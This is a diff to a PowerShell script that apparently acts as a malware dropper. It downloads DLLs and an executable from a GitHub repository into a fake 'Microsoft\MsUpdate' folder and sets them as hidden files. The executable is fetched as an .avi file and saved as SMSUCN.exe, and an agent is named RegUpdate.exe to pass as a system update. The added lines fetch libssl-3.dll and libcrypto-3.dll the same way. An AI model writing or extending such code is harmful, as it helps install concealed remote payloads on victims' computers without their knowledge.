@@ -20,6 +20,25 @@ if ((Get-Item $rutaLocalAgent).Name -ne "RegUpdate.exe") {
 $atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
 
+
+#Copy DLLs
+$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libssl-3.dll"
+$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/libssl-3.dll"
+if (-not (Test-Path $rutaLocalAgent)) {
+    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
+}
+$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
+#----
+$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcrypto-3.dll"
+$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/libcrypto-3.dll"
+if (-not (Test-Path $rutaLocalAgent)) {
+    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
+}
+$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
+
+
 # Copy Ejecuter
 $rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
 $urlRemotoEjecuter = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
